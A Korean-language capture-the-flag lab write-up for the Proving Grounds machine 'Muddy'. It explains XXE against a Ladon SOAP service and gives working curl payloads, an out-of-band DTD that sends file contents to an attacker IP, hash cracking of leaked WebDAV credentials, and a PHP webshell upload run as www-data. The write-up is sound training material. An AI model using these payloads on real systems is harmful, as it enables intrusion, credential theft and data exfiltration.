---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/webdav
  - tech/lin/path-hijack
  - tech/lin/cron
  - tech/cred/crack
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.161
ports: [22, 25, 80, 111, 8888]
services: [http, rpcbind, smtp, ssh]
status: solved
manual_tags: true
tech_count: 5
---
> [!info] PG Practice — Pentester Foundations #10
> **타겟** 192.168.248.161 · **OS** Debian (`muddy`) · **난이도** Fundamental · **플래그 2개**
> **경로 요약** 8888 Ladon SOAP → **XXE**로 `passwd.dav` 탈취 → 해시 크랙 → WebDAV PHP 웹셸 → `www-data` → **크론 `PATH=/dev/shm:...` 하이재킹** → root

## 0. 이 박스에서 배우는 것

- **XXE(XML External Entity)의 메커니즘** — DTD·엔티티·외부 엔티티가 무엇이고, `SYSTEM "file:///..."`이 왜 파일을 읽어오는가
- **"파일명 파라미터가 없다"에서 XXE로 넘어가는 판단** — LFI라고 알려진 박스가 실제로는 XXE였다
- **XXE의 구조적 한계** — 읽어온 내용이 다시 XML로 파싱되므로 `<`가 든 파일은 못 읽는다. 우회책과 **"과잉 대응 금지"** 판단
- **런타임 traceback으로 라이브러리 버전을 확정하는 기법** — 파일 경로 + **행 번호 + 소스 텍스트**를 배포본과 대조
- **해시 접두어(`$apr1$` 등)로 포맷을 즉시 판별**하고 john `--format`을 맞추는 법
- **크론 `PATH` 하이재킹** — 상대경로 호출이 아니라 **쓰기 가능한 디렉터리가 PATH 앞에 있는 것**이 결함의 본체
- **하이재킹 바이너리가 원래 동작을 보존해야 하는 이유** — `&&` 체인과 종료 코드
- **스캐너·캡처 결과를 그대로 믿지 않는 습관** — `--min-rate` 오탐, 스크린샷 오류 페이지

> [!tip] 시험 출제 가능성
> **XXE는 중간, 크론 PATH 하이재킹은 높다.**
> XXE 자체는 OSCP 시험에 자주 나오는 유형은 아니지만, **"XML을 받아먹는 엔드포인트"**(SOAP·XML-RPC·SAML·문서 업로드·XML 설정 임포트)는 계속 등장한다. 이 노트의 값어치는 페이로드가 아니라 **"파일명 파라미터가 없을 때 무엇을 의심하는가"** 라는 반사신경이다.
> 크론 기반 권한상승은 시험 단골이고, 그중 **`PATH` 하이재킹**은 SUID·와일드카드·쓰기 가능 스크립트와 함께 4대 패턴이다. ([[Astronaut]] · [[Exfiltrated]]와 같은 계열)
> 금지 도구 의존이 **없는** 박스라 시험 재현성이 높다 — `curl`·`john`·`nc`만으로 끝난다.

---

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Muddy]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.161
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian
25/tcp   open  smtp    Exim smtpd
80/tcp   open  http    Apache 2.4.38   → 302 http://muddy.ugc/  (WordPress 5.7)
111/tcp  open  rpcbind
8888/tcp open  http    WSGIServer/0.1 Python/2.7.16
```

```bash
┌──(kali㉿kali)-[~/PG/Muddy]
└─$ echo '192.168.248.161 muddy.ugc muddy' | sudo tee -a /etc/hosts
```

`302 http://muddy.ugc/` 때문에 **`/etc/hosts` 등록이 선행 조건**이다. 안 하면 80번은 브라우저에서 그냥 죽는다. 리다이렉트 Location에 도메인이 보이면 반사적으로 hosts에 넣는다.

### 포트 재판정 — `--min-rate 5000`이 만든 오탐

`--min-rate 5000` 스캔은 위 5개 외에 **443 · 808 · 908**도 열림으로 보고했다. 이 셋은 **전부 오탐이다.** 낮은 레이트로 독립 재스캔한 결과:

```
Not shown: 65530 closed tcp ports
→ 실제 열린 포트는 22 · 25 · 80 · 111 · 8888 다섯 개뿐
```

세 포트 모두 `curl`에 **빈 응답**이 돌아왔다. 즉 서비스가 없다.

> [!danger] `--min-rate`를 높이면 오탐이 생긴다
> 패킷을 초당 수천 개로 밀어넣으면 대상 호스트나 중간 장비가 **응답을 흘리거나 RST를 재정렬**해서, nmap이 상태를 잘못 판정한다. `-Pn`과 겹치면 더 심해진다. [가정] 이 박스의 오탐도 레이트 초과로 인한 응답 유실이 원인으로 보인다.
> **운용 규칙: `--min-rate`는 "어떤 포트를 다시 볼지" 고르는 1차 필터로만 쓰고, 익스플로잇 대상이 될 포트는 반드시 낮은 레이트로 재확인한다.**
> ```bash
> # 1단계 — 빠르게 후보만
> sudo nmap -p- --min-rate 5000 -T4 -Pn <IP> -oN fast.log
> # 2단계 — 후보 포트만 낮은 레이트로 확정 + 버전
> sudo nmap -sS -sCV -p 22,25,80,111,8888 -Pn <IP> -oN slow.log
> ```
> 존재하지 않는 443에 30분을 태우는 것이 시험에서 가장 흔한 시간 손실이다. **"열려 있다는데 응답이 비어 있다"면 포트를 의심하라, 서비스를 의심하지 말고.**

### 80/tcp — WordPress 5.7은 미끼다

![[PG-Muddy-wordpress_80.png]]

| 항목 | 값 |
|---|---|
| CMS | WordPress **5.7** |
| 테마 | shapely |
| 플러그인 | kali-forms **2.3.0** |
| `wp-login.php` | **`/404`로 리다이렉트** — 로그인 폼 자체가 봉쇄 |
| `wp-json` | **401** |

**진입점이 아니다.** 판단 근거는 두 가지다:

1. **인증 표면이 물리적으로 없다.** `wp-login.php`가 404로 튕기면 크리덴셜 스터핑도, 사용자 열거도, 브루트포스도 성립하지 않는다. 취약 플러그인을 찾아내도 **인증 후 익스플로잇이면 못 쓴다.**
2. **`wp-json`이 401**이라 REST 경로 사용자 열거(`/wp-json/wp/v2/users`)도 막혔다.

> [!warning] "버전이 낮다"는 것만으로 공격면이 되지 않는다
> WordPress 5.7 + 구형 플러그인은 시각적으로 매우 유혹적이다. 하지만 **도달 가능한 입력이 없으면 공격면이 아니다.**
> 시험에서의 판정 순서는 항상 이렇다 — ① 인증 없이 닿는 엔드포인트가 있는가 → ② 그 엔드포인트가 입력을 받는가 → ③ 그 입력이 위험한 싱크에 닿는가. ①에서 막히면 **버전이 아무리 낮아도 넘어간다.**
> `wpscan`으로 플러그인을 훑는 데 30분을 쓰기 전에 `curl -I http://target/wp-login.php` 한 줄로 ①을 먼저 판정하라.

### 8888/tcp — 진짜 진입점

![[PG-Muddy-ladon_8888.png]]

`WSGIServer/0.1 Python/2.7.16` + "Powered by Ladon for Python" — **Ladon SOAP/RPC 프레임워크**다.

카탈로그 화면이 그대로 공격 지도를 준다:

| 항목 | 값 |
|---|---|
| 서비스명 | `muddy` |
| 노출 인터페이스 | `xmlrpc` · `jsonrpc10` · `jsonwsp` · `soapdocumentliteral` · `soap11` · `soap` (6종) |
| 노출 메서드 | **`checkout(string uid)`** 하나 |
| 파라미터명 | **`uid`** — 전 인터페이스 공통 |

> [!tip] `WSGIServer/0.1 Python/2.7.x`는 그 자체가 신호다
> Python 2.7은 2020년에 EOL됐다. 개발 서버(`WSGIServer`)로 노출돼 있다는 건 **레거시 + 개발 설정**이라는 뜻이고, 구형 XML 파서는 **외부 엔티티가 기본 활성**인 경우가 많다.
> [[Levram]]의 `WSGIServer 0.2`(Django), [[RubyDome]]의 `WEBrick`과 같은 계열의 단서다.

### Ladon 버전 판정 — traceback을 지문으로 쓴다 [확정: 0.9.x, ≤0.9.40]

이 박스에서 가장 재사용 가치가 높은 기법이다. 타겟이 `/muddy/xmlrpc/description` 요청에 **런타임 traceback을 그대로 유출**했다:

```
File "/usr/local/lib/python2.7/dist-packages/ladon/server/wsgi_application.py", line 490, in __call__
    output += dispatcher.iface.description(service_url,charset,**dict(map(lambda x: (x[0],x[1][0]), query.items())))
File "/usr/local/lib/python2.7/dist-packages/ladon/interfaces/base.py", line 81, in description
    **kw)
File "/usr/local/lib/python2.7/dist-packages/ladon/interfaces/xmlrpc.py", line 195, in generate
    self._get_type_name(method_info['rtype'][0])
TypeError: 'type' object has no attribute '__getitem__'
```

Python traceback은 **파일 경로 + 행 번호 + 그 행의 소스 텍스트**를 함께 준다. 이건 사실상 **버전 지문**이다. PyPI에서 sdist 11종을 받아 세 파일의 해당 행을 대조했다:

```
0.9.30–0.9.40:  wsgi_application.py:490 => output += dispatcher.iface.description(...)   ← 타겟과 일치
                base.py:81              => **kw)                                          ← 일치
                xmlrpc.py:195           => self._get_type_name(method_info['rtype'][0])   ← 일치

1.0.0–1.0.7:    wsgi_application.py:490 => if sinst and ifclass: / dispatcher = None       ← 불일치
                base.py:81              => self._sinfo.method_list(),                      ← 불일치
                xmlrpc.py:195           => method_el.setAttribute(                         ← 불일치
```

**세 파일이 동시에 일치하는 구간은 0.9.30–0.9.40뿐이다.**

> [!warning] 여기서 더는 못 좁힌다 — **세부 버전 미확정**
> 0.9.30부터 0.9.40까지는 문제의 세 파일이 **바이트 단위로 동일**하다. 즉 이 traceback만으로는 `0.9.35`인지 `0.9.40`인지 구분할 수 없다.
> **"0.9.x 계열, 1.0 미만"까지가 확정 사실이고, 그 이상은 추정이다.** 익스플로잇 판단에는 이 정도로 충분했다 — 이후 확인한 XXE 싱크가 0.9 전 구간에 공통이기 때문이다.
> [가정] 랩 이미지의 배포 시점을 보면 0.9.40일 가능성이 높지만, 근거가 없으므로 노트에는 구간으로만 남긴다.

> [!tip] 일반화 — 에러 페이지는 버전 판정의 1급 근거다
> 배너(`Server:` 헤더)는 위조가 쉽고 생략도 흔하다. 반면 **traceback·스택 트레이스·디버그 페이지**는 실제 실행 중인 코드에서 나오므로 위조가 사실상 없다.
> 절차: ① 존재하지 않는 파라미터·잘못된 타입·빈 값으로 **일부러 500을 낸다** → ② 노출된 파일 경로·행 번호·소스 텍스트를 기록 → ③ PyPI/npm/Maven에서 후보 버전 소스를 받아 **같은 행을 대조**.
> Python `traceback`, Java 스택 트레이스, Rails `.rb:행번호`, PHP `Fatal error ... on line N` 전부 같은 방식으로 쓸 수 있다.
> 이 노트의 "버전 판정은 독립 근거 2개" 패턴 계열: [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]]

### WebDAV 열거 — 401 벽

80번에는 `/webdav/`가 있고 Basic 인증이 걸려 있다:

```
WWW-Authenticate: Basic realm="Restricted Content"
```

`GET` · `OPTIONS` · `PROPFIND` **전부 401**이다. 즉 **비인증으로는 허용 메서드 목록조차 얻지 못한다.**

> [!note] WebDAV를 만나면 `OPTIONS`부터 — 단 인증이 걸리면 그것도 안 된다
> 정상적인 WebDAV 열거 순서는 `OPTIONS`로 `Allow:`/`DAV:` 헤더를 받아 **`PUT`·`MOVE`·`COPY`가 열려 있는지** 확인하는 것이다.
> 이 박스는 401이라 그 단계 자체가 봉쇄다. **자격증명이 없으면 WebDAV는 아무것도 알려주지 않는다** → 자격증명 획득이 선행 과제라는 뜻이고, 이게 XXE로 가는 동기가 된다.

`/webdav/`의 인증 정보가 어딘가 파일로 있을 것이라는 추론에서 `.htpasswd`를 찔러봤다:

```
GET /webdav/.htpasswd   → 403 Forbidden
```

> [!tip] **403과 404를 구분해서 읽어라 — 이게 열거의 핵심 기술이다**
> `404`는 "없다", `403`은 "있는데 못 준다"에 가깝다.
> 여기서 403이 나온 이유는 Apache 기본 설정의 이 블록 때문이다:
> ```apache
> <FilesMatch "^\.ht">
>     Require all denied
> </FilesMatch>
> ```
> 이 규칙은 **파일 존재 여부와 무관하게** `.ht`로 시작하는 이름을 전부 막는다. 따라서 403 자체가 "파일이 있다"의 증명은 아니다.
> 하지만 **"HTTP로는 절대 못 가져온다"는 사실은 확정**된다 → 그래서 **HTTP를 우회하는 읽기 원시 함수(primitive)** 가 필요해진다. 그게 XXE다.
> 반대로 404였다면 경로 추측이 틀렸다는 뜻이라 다른 경로를 더 찾았을 것이다. **응답 코드가 다음 행동을 바꾼다.**

---

## 2. 취약점 분석 — XXE

### 2-1. 배경 지식 — DTD와 엔티티가 무엇인가

XXE를 페이로드 암기로 다루면 변형이 나왔을 때 무너진다. 먼저 XML 자체의 구조를 본다.

**엔티티(entity)** 는 XML의 매크로다. 문서 안에서 반복되는 문자열에 이름을 붙이고, 파서가 그 이름을 만나면 **정의된 값으로 치환**한다.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY company "ACME Corp"> ]>
<doc>&company;</doc>
```

파서는 `&company;`를 만나면 `ACME Corp`으로 바꾼다. 결과는 `<doc>ACME Corp</doc>`이다.

여기서 세 가지 부품이 등장한다:

| 부품 | 역할 |
|---|---|
| `<!DOCTYPE foo [ ... ]>` | **DTD(Document Type Definition)**. 문서의 문법과 엔티티를 선언하는 영역. `[ ]` 안이 **내부 서브셋** |
| `<!ENTITY 이름 "값">` | **내부 일반 엔티티**. 값이 문서 안에 직접 적혀 있다 |
| `&이름;` | **엔티티 참조**. 파서가 여기서 치환을 수행한다 |

### 2-2. `SYSTEM`이 붙는 순간 파일 읽기가 된다

엔티티의 값을 문서에 직접 적는 대신 **외부에서 가져오라고 지시**할 수 있다. 그게 `SYSTEM` 키워드다:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

이제 `&xxe;`는 "이 자리에 `file:///etc/passwd`의 **내용**을 넣어라"가 된다. 이것이 **외부 일반 엔티티(external general entity)** 이고, 이걸 악용하는 것이 **XXE(XML External Entity)** 다.

> [!note] 왜 파일 읽기가 "정상 기능"인가
> XXE는 파서의 버그가 아니라 **XML 1.0 명세에 있는 기능**이다. 원래 목적은 "여러 문서가 공용 DTD·공용 텍스트 조각을 참조한다"였고, 그래서 `SYSTEM` URI는 로컬 파일 경로도, HTTP URL도 받는다.
> 문제는 **공격자가 XML 문서 전체를 제어할 수 있는 환경**에서 이 기능이 그대로 살아 있다는 점이다. 애플리케이션은 `<uid>` 값 하나만 기대했는데, 공격자는 **DTD 선언부까지** 함께 보낸다.
> 그래서 XXE의 진입점은 언제나 **"서버가 사용자가 보낸 XML을 파싱하는 곳"** 이다 — SOAP, XML-RPC, SAML 응답, DOCX/XLSX/SVG 업로드, XML 설정 임포트, RSS 취합.

`SYSTEM` URI가 지원하는 스킴에 따라 파생 공격이 갈린다:

| URI | 결과 |
|---|---|
| `file:///etc/passwd` | **로컬 파일 읽기** (이 박스) |
| `http://내서버/x` | **SSRF** — 내부망 스캔·메타데이터 서비스 접근 |
| `php://filter/convert.base64-encode/resource=...` | PHP 한정. **내용을 base64로 감싸** 파싱 붕괴 회피 |
| `expect://id` | PHP `expect` 확장이 있으면 **RCE** (드묾) |

### 2-3. 파서 하드닝이 무엇을 막는가

XXE를 막는 정석은 **파서 단에서 외부 엔티티 확장을 끄는 것**이다. Python `xml.sax`에서는 이렇게 한다:

```python
from xml.sax.handler import feature_external_ges
parser = make_parser()
parser.setFeature(feature_external_ges, False)   # ← 이 한 줄이 XXE를 죽인다
```

`feature_external_ges`는 **external general entities**의 약자다. 이걸 `False`로 두면 파서는 `<!ENTITY xxe SYSTEM "file:///...">`를 **선언은 받되 확장하지 않는다.** `&xxe;`는 빈 문자열이 되거나 예외가 난다.

> [!danger] **Python 2.7의 기본값은 "활성"이다**
> `xml.sax`가 쓰는 expat 백엔드는 `feature_external_ges`가 **기본 True**다. 즉 **아무것도 안 하면 XXE에 취약하다.**
> 이건 "구버전이라 취약"이 아니라 **"안전하지 않은 기본값(insecure default)"** 이라는 별개의 결함 클래스다. 개발자가 실수한 게 아니라 **아무것도 안 한 것**이 취약점이 된다.
> 언어별 기억법:
> - Python 2.7 `xml.sax`/`minidom` — **기본 취약**. `defusedxml`로 교체하는 것이 권장 해법
> - Java `DocumentBuilderFactory` — **기본 취약**. `setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` 필요
> - PHP `libxml` < 2.9 — **기본 취약**. 2.9부터 기본 비활성
> - .NET `XmlDocument` 구버전 — `XmlResolver = null` 필요
>
> **"XML을 받는 엔드포인트를 만나면 일단 XXE를 시도한다"** 가 합리적인 이유가 이것이다. 안전한 쪽이 예외적이다.

### 2-4. 왜 Ladon이 취약한가 — 소스 수준 근거

PyPI 원본을 열어 실제 싱크를 확인했다. **타겟에 페이로드를 보내기 전에 확보한 근거**다.

```python
# ladon/interfaces/soap.py:645   (soap11.py:541 도 동일한 코드)
def parse_request(self,soap_body,sinfo,encoding):
    parser = make_parser()          # ← setFeature(feature_external_ges, False) 가 없다
    ch = SOAPContentHandler(parser)
    parser.setContentHandler(ch)
    inpsrc = InputSource()
    inpsrc.setByteStream(BytesIO(soap_body))
    parser.parse(inpsrc)
```

```python
# ladon/interfaces/xmlrpc.py:304
req_doc = parseString(req)          # xml.dom.minidom — 역시 하드닝 없음
```

**하드닝이 전무하다.** `make_parser()` 직후에 와야 할 `setFeature(feature_external_ges, False)` 가 없고, 대신 곧바로 사용자 바디(`soap_body`)를 `parse()`에 밀어넣는다.

데이터 흐름을 한 줄로 정리하면:

```
HTTP POST 바디 (공격자 100% 제어)
  → soap_body
  → InputSource.setByteStream()
  → parser.parse()            ← expat, feature_external_ges = True(기본)
  → <!ENTITY xxe SYSTEM "file:///..."> 확장 발생
  → &xxe; 가 파일 내용으로 치환됨
  → checkout(uid=<파일 내용>) 호출
  → 응답 <result>Serial number: <파일 내용></result> 로 반사
```

마지막 줄이 결정적이다. **애플리케이션이 `uid`를 응답에 그대로 되돌려주기 때문에**, 별도의 OOB 채널 없이 **인밴드(in-band)로 파일 내용을 읽을 수 있다.** 만약 `checkout()`이 입력을 반사하지 않았다면 blind XXE가 되어 OOB DTD가 필수였을 것이다.

### 2-5. 어느 엔드포인트를 때릴 것인가 — 등급표

카탈로그에 인터페이스가 6개지만 **전부 동등하지 않다.** 파서 종류로 등급이 갈린다:

| 엔드포인트 | 파서 | 등급 |
|---|---|---|
| `/muddy/soap11` | `xml.sax.make_parser()` | **최우선** |
| `/muddy/soap` | `xml.sax.make_parser()` | **최우선** |
| `/muddy/soapdocumentliteral` | `xml.sax.make_parser()` | **최우선** |
| `/muddy/xmlrpc` | `minidom.parseString()` | 차선 |
| `/muddy/jsonwsp` | JSON | **해당 없음** |
| `/muddy/jsonrpc10` | JSON | **해당 없음** |

파라미터명은 전 인터페이스 공통 **`uid`** 다.

> [!tip] 프레임워크가 여러 인터페이스를 노출하면 **가장 XML스러운 것**을 고른다
> JSON 인터페이스는 XXE와 무관하다. 같은 백엔드 메서드(`checkout`)를 부르더라도 **입력 파서가 다르면 취약점도 다르다.**
> 일반화: **"같은 기능의 엔드포인트가 여럿이면 전부 열거하고, 파싱 방식이 다른 것끼리 나눠라."** 하나가 막혀도 다른 하나는 열려 있는 경우가 실전에서 매우 흔하다.

### 2-6. 왜 이 페이로드인가 — 조각 해설

```bash
┌──(kali㉿kali)-[~/PG/Muddy]
└─$ curl -s -X POST http://192.168.248.161:8888/muddy/soap11 \
     -H 'Content-Type: text/xml;charset=UTF-8' --data-binary @- <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:muddy">
<soapenv:Body><urn:checkout><uid>&xxe;</uid></urn:checkout></soapenv:Body>
</soapenv:Envelope>
EOF
```

응답의 `<result>Serial number: ...</result>` 안에 **파일 내용이 반사**된다.

> [!note] 페이로드 조각별 역할
> | 조각 | 역할 |
> |---|---|
> | `<?xml version="1.0" encoding="utf-8"?>` | XML 선언. 없어도 대개 파싱되지만 인코딩을 명시해 두면 다국어 파일에서 사고가 줄어든다 |
> | `<!DOCTYPE foo [ ... ]>` | **DTD 내부 서브셋을 여는 부분.** `foo`는 루트 엘리먼트 이름 자리인데 검증을 안 하므로 아무거나 써도 된다 |
> | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | **공격의 본체.** 외부 일반 엔티티를 선언한다 |
> | `xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"` | SOAP 1.1 봉투 네임스페이스. **틀리면 Ladon이 바디를 못 찾아 파싱 이전에 거절**한다 |
> | `xmlns:urn="urn:muddy"` | 서비스 네임스페이스. 카탈로그의 서비스명 `muddy`에서 온다 |
> | `<urn:checkout><uid>&xxe;</uid></urn:checkout>` | 노출 메서드와 파라미터명. **여기서 엔티티가 확장**된다 |
> | `&xxe;` | 참조. 이 자리가 파일 내용으로 치환된다 |

> [!warning] curl 플래그 해설 — 빼면 어떻게 실패하는가
> | 플래그 | 이유 |
> |---|---|
> | `-X POST` | SOAP은 POST 전용. GET이면 405/404 |
> | `-H 'Content-Type: text/xml;charset=UTF-8'` | **필수.** 이게 없으면 curl이 `application/x-www-form-urlencoded`를 붙이고, Ladon 디스패처가 XML 인터페이스로 라우팅하지 않는다 |
> | `--data-binary @-` | **`-d`를 쓰면 안 된다.** `-d`는 입력에서 **개행을 제거**한다. XML은 개행이 없어도 대개 파싱되지만, **DTD 선언과 본문이 한 줄로 붙으면 디버깅이 지옥**이 되고 일부 파서는 실제로 깨진다. `@-`는 stdin에서 읽으라는 뜻 |
> | `<<'EOF'` (따옴표 포함) | **작은따옴표가 결정적이다.** 따옴표를 빼면 셸이 heredoc 안의 `$`·`` ` ``를 확장해 버린다. 페이로드에 `$`가 들어가는 순간(예: `$apr1$` 검색) 조용히 망가진다 |
> | `-s` | 진행률 표시 제거. 출력 파싱을 자동화할 때 필수 |

### 2-7. XXE의 구조적 한계 — `<`가 든 파일은 못 읽는다

> [!danger] 읽어온 내용이 **다시 XML 문서의 일부가 된다**
> 엔티티 확장은 "값을 변수에 담는" 것이 아니라 **"문서에 텍스트를 삽입하는"** 동작이다. 삽입된 텍스트는 곧바로 파서에게 다시 먹힌다.
> 따라서 파일에 `<` 나 `&` 가 있으면 파서는 그걸 **새로운 태그·새로운 엔티티 참조로 해석**하려 하고, 문서가 깨진다. 이 박스에서는 이런 트레이스백만 돌아온다:
> ```
> UnboundLocalError: local variable 'req_dict' referenced before assignment
> ```
> **이건 "취약하지 않다"가 아니다.** 파싱이 중간에 죽어서 `req_dict`가 할당되기 전에 참조된 것이고, 곧 **"엔티티 확장은 일어났는데 그 결과가 문법을 깼다"** 는 뜻이다. 오히려 **취약함의 방증**이다.
> 그래서 `apache2.conf`·`wp-config.php`처럼 `<`가 잔뜩 든 파일은 이 방식으로 못 읽는다.

읽을 수 있는 것과 없는 것을 미리 분류하면 시간을 아낀다:

| 읽힌다 | 안 읽힌다 |
|---|---|
| `/etc/passwd` · `/etc/shadow` · `/etc/hosts` | `*.conf` (Apache/nginx — `<Directory>` 등) |
| `.htpasswd` · `passwd.dav` | `*.php` (`<?php`) |
| `/etc/crontab` · `/proc/self/environ` | `*.xml` · `*.html` |
| SSH 개인키 (`-----BEGIN`) | 부등호가 든 스크립트 (`if [ $a < $b ]`) |

**우회책 두 가지:**

1. **OOB(Out-of-Band) DTD** — 내용을 로컬에서 다시 파싱하지 않고 **외부 서버로 전송**시킨다. 파라미터 엔티티(`%`)를 써서 공격자 서버의 DTD를 불러오고, 그 안에서 파일 내용을 URL에 실어 보낸다.
   ```xml
   <!DOCTYPE foo [
     <!ENTITY % file SYSTEM "file:///etc/apache2/apache2.conf">
     <!ENTITY % dtd  SYSTEM "http://192.168.45.207/evil.dtd">
     %dtd;
   ]>
   ```
   ```
   evil.dtd:
   <!ENTITY % all "<!ENTITY send SYSTEM 'http://192.168.45.207/?d=%file;'>">
   %all;
   ```
   응답이 아니라 **공격자 웹서버 로그**로 데이터를 받는다.

2. **`php://filter` base64 래핑** — PHP 애플리케이션 한정. 내용을 base64로 인코딩해 넘기므로 `<`가 사라진다.
   ```xml
   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php">
   ```
   Ladon은 Python이라 **이 박스에는 쓸 수 없다.**

> [!tip] **목표가 평문이면 과잉 대응하지 마라**
> 이 박스에서는 **둘 다 필요 없었다.** 목표 파일 `passwd.dav`는 `사용자명:해시` 한 줄짜리 평문이고 `<`가 없다.
> OOB DTD를 세팅하는 데는 웹서버 기동·DTD 작성·아웃바운드 연결 확인까지 최소 10분이 든다. **"고급 기법을 안다"와 "지금 그게 필요하다"는 다르다.**
> 판단 순서: ① 목표 파일이 무엇인지 먼저 정하고 → ② 그 파일에 `<`가 있을 법한가 판단 → ③ 없으면 그냥 인밴드로 읽는다.
> `/etc/passwd`가 읽혔다는 것 자체가 "인밴드가 된다"의 증명이므로, **자격증명 파일 하나 읽는 데 OOB를 꺼내는 것은 시간 낭비**다.

### 2-8. XXE인가 LFI인가 — 실제로 확인했다

사용자의 기존 노트는 **LFI**라고 적혀 있었지만 랩 브리핑은 **XXE**라고 한다. 확인 결과 **XXE가 맞다**:

- 파일명을 받는 파라미터가 **어디에도 없다.** `uid`는 SOAP XML 바디로 전달된다.
- 80번 WordPress에도 LFI 파라미터가 없다.
- Ladon의 XML 파서가 **외부 엔티티를 그대로 확장**한다 (2-4의 소스 근거).

> [!warning] 남이 정리한 노트의 취약점 분류를 그대로 믿지 마라
> "LFI"와 "XXE"는 둘 다 임의 파일 읽기로 귀결되지만 **진입점과 페이로드 형태가 완전히 다르다.**
> LFI를 찾는다면 `?page=`·`?file=`·`?template=` 같은 **파라미터**를 뒤진다. XXE라면 **XML 바디 전체**를 다시 쓴다. 대상이 다르니 도구도 다르고, 잘못된 분류를 믿으면 **없는 파라미터를 몇 시간 찾는다.**
> **판별 규칙: 파일명을 받을 만한 파라미터를 아무리 찾아도 없으면, "입력이 XML/직렬화 형식으로 들어가는 곳"을 의심한다.**

---

## 3. Foothold

### 3-1. 자격증명 확보

XXE로 WebDAV 인증 파일을 읽었다. 같은 내용이 두 곳에 있다:

```
/var/www/html/webdav/passwd.dav
/etc/apache2/passwd.dav              ← 같은 내용의 별개 사본
```
```
administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0
```

> [!note] 왜 두 곳을 다 확인했는가
> `.htpasswd` 계열 파일은 **`AuthUserFile` 지시어가 가리키는 곳**에 있다. 관례상 후보는 웹루트 안(`/var/www/html/<보호대상>/`)과 설정 디렉터리(`/etc/apache2/`) 둘이다.
> 설정 파일(`apache2.conf`)은 `<`가 들어 있어 XXE로 못 읽으므로 **`AuthUserFile` 값을 직접 확인할 수 없다.** 그래서 **관례 경로를 순서대로 찔러보는 것**이 유일한 방법이었다. 둘 다 나왔으니 어느 쪽이 진짜 참조되는지는 무의미하다.

### 3-2. 해시 크랙

`$apr1$` = **Apache MD5(md5crypt)**. john으로 크랙:

```bash
┌──(kali㉿kali)-[~/PG/Muddy]
└─$ john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
sleepless        (administrant)
1g 0:00:00:00 DONE (2026-08-20 09:06) 2.631g/s 184421p/s
```

**`administrant` / `sleepless`** — 사용자 노트의 값이 실측으로 확인됐다.

> [!tip] 해시 접두어로 포맷을 즉시 판별한다
> `$` 로 시작하는 해시는 **`$id$salt$hash`** 구조이고, `id` 자리가 알고리즘을 말해준다.
>
> | 접두어 | 알고리즘 | john `--format` | hashcat `-m` |
> |---|---|---|---|
> | `$apr1$` | **Apache MD5 (APR1)** | `md5crypt` (또는 `md5crypt-long`) | `1600` |
> | `$1$` | md5crypt (전통 Unix) | `md5crypt` | `500` |
> | `$5$` | SHA-256 crypt | `sha256crypt` | `7400` |
> | `$6$` | SHA-512 crypt | `sha512crypt` | `1800` |
> | `$2a$` `$2b$` `$2y$` | bcrypt | `bcrypt` | `3200` |
> | `$y$` | yescrypt (최신 Debian/Ubuntu `/etc/shadow`) | — | — |
> | 접두어 없는 32 hex | 원시 MD5 | `raw-md5` | `0` |
>
> **`--format`을 안 주면 john이 오판해서 영영 안 깨진다.** `$apr1$`은 특히 `md5crypt`로 잡아야 하는데, 자동 감지가 다른 후보를 먼저 고르는 경우가 있다.
> `--format`이 헷갈리면 후보를 나열시킨다: `john --list=formats | tr ',' '\n' | grep -i md5`

> [!warning] `$y$` (yescrypt)는 john/hashcat 표준 빌드로 잘 안 깨진다
> 최신 Debian 12·Ubuntu 22.04+ 의 `/etc/shadow`가 이 포맷이다. 시험에서 `$y$`를 봤다면 **크랙에 시간을 쓰지 말고 다른 경로를 찾아라.** 크랙 가능성이 낮은 해시에 시간을 태우는 것이 가장 흔한 손실이다.

### 3-3. WebDAV 웹셸 업로드

```bash
┌──(kali㉿kali)-[~/PG/Muddy]
└─$ printf '%s\n' '<?php system($_REQUEST["c"]); ?>' > /tmp/sh.php
┌──(kali㉿kali)-[~/PG/Muddy]
└─$ curl -T /tmp/sh.php --user administrant:sleepless http://192.168.248.161/webdav/sh.php
HTTP/1.1 201 Created

┌──(kali㉿kali)-[~/PG/Muddy]
└─$ curl -s --user administrant:sleepless 'http://192.168.248.161/webdav/sh.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> [!note] 플래그 해설
> | 조각 | 역할 |
> |---|---|
> | `curl -T <파일>` | **HTTP `PUT`** 을 보낸다. WebDAV의 파일 생성 메서드다. `-X PUT --data-binary @파일`과 달리 Content-Length·전송을 curl이 알아서 처리한다 |
> | `--user u:p` | Basic 인증 헤더. `-u`와 동일 |
> | `$_REQUEST` | `$_GET`·`$_POST`·`$_COOKIE`를 **모두** 받는다. GET으로 빠르게 찔러보다가 페이로드가 길어지면 그대로 POST로 전환할 수 있어 실전에서 편하다 |
> | `201 Created` | PUT 성공. **`204 No Content`면 덮어쓰기 성공**이라는 뜻이라 이것도 성공이다 |

> [!danger] 업로드한 웹셸을 **호출할 때도** 인증이 필요하다
> `/webdav/`는 `GET`에도 Basic auth를 요구한다. `--user`를 빼면 **401이 돌아와서 "업로드가 실패했나" 하고 오인**하기 쉽다.
> 업로드(`201 Created`)와 실행은 **별개 요청**이다. 둘 다 인증을 붙여라.
> 일반화: **인증 영역 안에 파일을 올렸으면, 그 파일도 인증 영역 안이다.** 브라우저로 확인할 때도 마찬가지라 "브라우저에서는 안 되는데 curl에서는 되네" 같은 혼란이 생긴다.

